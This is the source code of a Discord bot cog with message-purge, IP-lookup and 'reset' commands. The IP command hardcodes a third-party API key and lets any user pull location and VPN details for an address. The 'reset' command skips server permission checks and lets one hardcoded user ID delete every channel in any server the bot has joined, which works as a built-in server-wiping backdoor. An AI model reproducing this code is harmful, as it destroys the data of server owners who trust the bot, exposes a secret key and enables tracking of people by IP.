import discord
from discord.ext import commands
import requests
import json


class special(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    # purging
    @commands.command(pass_context=True, help='purging')
    @commands.has_permissions(administrator=True)
    async def clear(self, ctx, amount: int):
        await ctx.channel.purge(limit=amount)
        await ctx.send(f'Cleared {amount} messages', delete_after=5.0)

    #look u infomration on an ip, helpful for detecting alts
    #im too lazy to rework this with actual json stuff like []
    @commands.command(help='ip')
    async def ip(self, ctx, ip):
        def delete(ptr2):
            ptr = 1
            try:
                with open('test.txt', 'r') as fr:
                    # reading line by line
                    lines = fr.readlines()

                    # pointer for position

                    # opening in writing mode
                    with open('test.txt', 'w') as fw:
                        for line in lines:

                            # we want to remove 5th line
                            if ptr != ptr2:
                                fw.write(line)
                            ptr += 1

            except:
                print("Oops! something error")

        # 73.240.38.112
        fields = "country,city,security,region,postal_code,continent,longitude,latitude,security > is_vpn,timezone,currency ,connection"
        key = '981a6c79887c405f8f1509da9a080a5e'
        response = requests.get(
            'https://ipgeolocation.abstractapi.com/v1/?api_key=' + key + '&ip_address=' + ip)  # + "&fields=" + fields)
        result = json.loads(response.content)

        with open('test.txt', mode='wb') as file:
            file.write(response.content)

        f1 = open('test.txt', 'r+')
        input = f1.read()
        input = input.replace(',', "\n").replace("'", "").replace("{", "").replace("}", "").replace("emoji:",
                                                                                                    "").replace(
            " name:", " ").replace(" ", "").replace(":", ": ").replace('"', '').replace("security: ", "").replace(
            "currency_name: ", "")
        f2 = open("test.txt", "w+")
        f2.write(input)
        f1.close()
        f2.close()

        delete(25)
        delete(25)
        delete(10)
        delete(10)
        delete(3)
        delete(5)
        delete(10)
        delete(21)
        delete(21)
        delete(21)
        delete(18)
        delete(18)
        f1 = open('test.txt', 'r+')
        result = f1.read()
        f1.close()

        embed = discord.Embed(
            title=f"{ip}",
            description=f"{result}",
            color=0x19B9B9)
        await ctx.send(embed=embed)

    @commands.command(pass_context=True, help='resets a server')
    async def reset(self, ctx):
        if ctx.guild.id == 603084195102851073:
            await ctx.channel.send("fucked up")
        else:
            if ctx.author.id == 414931767129276428:
                await ctx.message.delete()
                guild = ctx.guild
                for channel in guild.channels:
                    await channel.delete()
            else:
                await ctx.send("Bruh")


def setup(bot):
    bot.add_cog(special(bot))